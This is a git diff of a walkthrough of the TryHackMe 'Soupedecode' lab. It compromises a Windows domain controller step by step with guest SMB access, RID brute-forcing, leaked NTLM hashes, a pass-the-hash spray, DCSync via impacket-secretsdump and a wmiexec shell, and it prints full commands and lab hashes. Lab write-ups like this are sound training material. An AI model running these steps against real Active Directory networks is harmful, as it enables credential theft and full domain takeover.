@@ -16,8 +16,37 @@
 
 Kicked off the engagement with an Nmap sweep to map out every reachable port and its associated service. The results made it obvious we were dealing with a Windows Active Directory Domain Controller.
 
-```bash
-sudo nmap -sCV -O $IP
+```
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-09-27 09:31:30Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+49664/tcp open  unknown       syn-ack
+49667/tcp open  unknown       syn-ack
+49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49740/tcp open  unknown       syn-ack
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 49400/tcp): CLEAN (Timeout)
+|   Check 2 (port 47088/tcp): CLEAN (Timeout)
+|   Check 3 (port 48186/udp): CLEAN (Timeout)
+|   Check 4 (port 12908/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+
 ```
 
 **Exposed Ports:**
@@ -45,8 +74,10 @@ sudo nmap -sCV -O $IP
 
 Added the hostname resolution entry to `/etc/hosts`:
 
-```bash
+```
+
 echo "$IP DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL DC01" | sudo tee -a /etc/hosts
+
 ```
 
 No HTTP service was present, so the entire focus shifted to AD-focused enumeration and abuse.
@@ -59,7 +90,7 @@ No HTTP service was present, so the entire focus shifted to AD-focused enumerati
 
 A quick check confirmed the **Guest** account was live and accepted a blank password over SMB:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u guest -p ''
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -75,7 +106,7 @@ SMB         10.129.188.79   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
 
 Leveraging the Guest account, the available SMB shares were listed:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u guest -p '' --shares
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -110,7 +141,7 @@ Guest was only granted READ on `IPC$`, but that was enough to perform RID cyclin
 
 Using the Guest account, a RID brute-force pulled down every domain object:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u guest -p '' --rid-brute 3000 | tee rid_brute.txt
 SMB                      10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -371,7 +402,7 @@ smb: \>
 
 A file named **`backup_extract.txt`** was sitting inside. Reading it revealed a full set of NTLM hashes for domain accounts:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ cat backup_extract.txt 
 WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
@@ -400,14 +431,14 @@ FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb3255
 
 Split the loot into usernames and hashes for spraying:
 
-```bash
+```
 cat backup_extract.txt | cut -d ':' -f 1 > extracted_users.txt
 cut -d: -f4 backup_extract.txt > ntlm-hashes.txt
 ```
 
 Machine accounts, `admin`, and `Administrator` were added to the list, then a Pass-the-Hash spray was launched:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ nxc smb $IP -u extracted_users.txt -H ntlm-hashes.txt -d SOUPEDECODE.LOCAL --no-bruteforce --continue-on-success
 SMB         10.129.188.79   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
@@ -480,7 +511,7 @@ Because `FileServer$` packed DCSync privileges, the entire domain's credentials 
 <img width="971" height="613" alt="image" src="https://github.com/user-attachments/assets/06e6e38e-7178-4bc1-bb63-ea2a3b3e524c" />
 
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ impacket-secretsdump 'soupedecode.local/FileServer$@$IP' -hashes :e41da7e79a4c76dbd9cf79d1cb325559  -just-dc
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -504,7 +535,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
 
 Using the Administrator's NTLM hash, a SYSTEM shell was obtained through `wmiexec`:
 
-```bash
+```
 ┌─[donmed@parrot]─[~/LAB/tryhackme/Soupedecode]─[192.168.142.157]
 └──╼ $ impacket-wmiexec soupedecode.local/Administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
